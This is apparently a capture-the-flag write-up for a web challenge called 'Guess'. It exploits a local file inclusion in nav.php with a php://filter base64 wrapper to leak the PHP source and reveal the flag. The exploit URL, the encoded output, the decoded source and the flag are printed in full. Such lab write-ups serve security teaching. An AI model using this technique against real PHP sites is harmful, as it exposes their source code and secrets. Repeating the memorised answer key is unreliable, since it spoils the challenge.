# Guess - Points: 20

### Description:

[This](http://challenge.acictf.com:13999/) website is running a guessing game that nobody has ever won. We'd like to be the first, but even when we guess the correct number it claims that we were wrong? Can you figure out what's going on?

### Hints

 - Play around with arguments to /nav.php?page=
 - Can you leak the source code for guess.php?

### Solution

When visiting the site, you are presented with a text input box that is some sort of guessing game. It turns out that this doesn't really matter.

In playing around with the site, you can see that some `nav.php` script takes a `page` as a GET parameter.

The interesting part about this is that this script seems to include some sort of local resource with that GET parameter. In other words, if you give that GET parameter nonsense, you aren't given a 404 error, but it simply fails to include anything.

The reason we can't just include any page we want and get the flag is because PHP is a scripting language. The page that the PHP scripts show are are the results on the script running - not the script itself. 

Armed with this knowledge, (and also understanding that PHP is a server side language), it is now apparent that we need to leak the source code of one of these include paths somehow. 

An interesting note about PHP is that the executable portion of the code has to reside within a `<?php` tag `?.\>`. Anything outside of the PHP tag will get treated as normal HTML. Therefore, if we took a normal PHP script, encoded it somehow, it wouldn't actually execute because the webserver would think it was just text.

Thankfully, PHP can help us do this. Using `php://filter/convert.base64-encode/resource=`, we can encode any local resource as base64. IF we were to use that base64 string as the input to the GET parameter for `nav.php`, the base64 encoded source code would be dumped to the page.

Which page should we try? I am going to start with the page we are given after we make a guess on the game since it seems like that's where the logic to keep us from winning lives.

URL: `http://challenge.acictf.com:13999/nav.php?page=php://filter/convert.base64-encode/resource=guess`

Returns: `PD9waHAKICAkZmxhZyA9ICJBQ0l7OGVmOTY0MGE0NGVkMjRkMzQ4ZjkyYzkzZmYzfSI7CiAgJG51bWJlciA9IHJhbmQoMSwxMCk7CgogIGlmICgkX0dFVFsnZ3Vlc3MnXSA9PT0gJG51bWJlcil7ID8+CiAgICA8aDM+IENvbmdyYXR1bGF0aW9ucyEgWW91IGhhdmUgZ3Vlc3NlZCBpdCEKICAgICAgICAgQ29udGFjdCB1cyB3aXRoIHRoZSB0b2tlbiBiZWxvdyB0byBoYXZlIHlvdXIgbmFtZSBhZGRlZCB0byB0aGUgd2lubmVycyBsaXN0ISA8L2gzPgogICAgICAgICA8aDM+IEhlcmUgaXMgeW91ciB0b2tlbjogPD9waHAgZWNobyAkZmxhZzsgPz4gPC9oMz4KICA8P3BocCB9ZWxzZXsgPz4KICAgIDxoMz4gTm9wZSwgdGhhdCBpcyB3cm9uZyEgVGhlIGFjdHVhbCBudW1iZXIgd2FzIDw/cGhwIGVjaG8gJG51bWJlcjs/PjwvaDM+CiAgPD9waHAgfQo/Pgo=`

That totally works.

    >>> import base64
    >>> print base64.b64decode('PD9waHAKICAkZmxhZyA9ICJBQ0l7OGVmOTY0MGE0NGVkMjRkMzQ4ZjkyYzkzZmYzfSI7CiAgJG51bWJlciA9IHJhbmQoMSwxMCk7CgogIGlmICgkX0dFVFsnZ3Vlc3MnXSA9PT0gJG51bWJlcil7ID8+CiAgICA8aDM+IENvbmdyYXR1bGF0aW9ucyEgWW91IGhhdmUgZ3Vlc3NlZCBpdCEKICAgICAgICAgQ29udGFjdCB1cyB3aXRoIHRoZSB0b2tlbiBiZWxvdyB0byBoYXZlIHlvdXIgbmFtZSBhZGRlZCB0byB0aGUgd2lubmVycyBsaXN0ISA8L2gzPgogICAgICAgICA8aDM+IEhlcmUgaXMgeW91ciB0b2tlbjogPD9waHAgZWNobyAkZmxhZzsgPz4gPC9oMz4KICA8P3BocCB9ZWxzZXsgPz4KICAgIDxoMz4gTm9wZSwgdGhhdCBpcyB3cm9uZyEgVGhlIGFjdHVhbCBudW1iZXIgd2FzIDw/cGhwIGVjaG8gJG51bWJlcjs/PjwvaDM+CiAgPD9waHAgfQo/Pgo=')
    <?php
      $flag = "ACI{8ef9640a44ed24d348f92c93ff3}";
      $number = rand(1,10);

      if ($_GET['guess'] === $number){ ?>
        <h3> Congratulations! You have guessed it!
             Contact us with the token below to have your name added to the winners list! </h3>
             <h3> Here is your token: <?php echo $flag; ?> </h3>
      <?php }else{ ?>
        <h3> Nope, that is wrong! The actual number was <?php echo $number;?></h3>
      <?php }
    ?>

    >>> 

It turns out that we are correct.


### Flag: `ACI{8ef9640a44ed24d348f92c93ff3}`

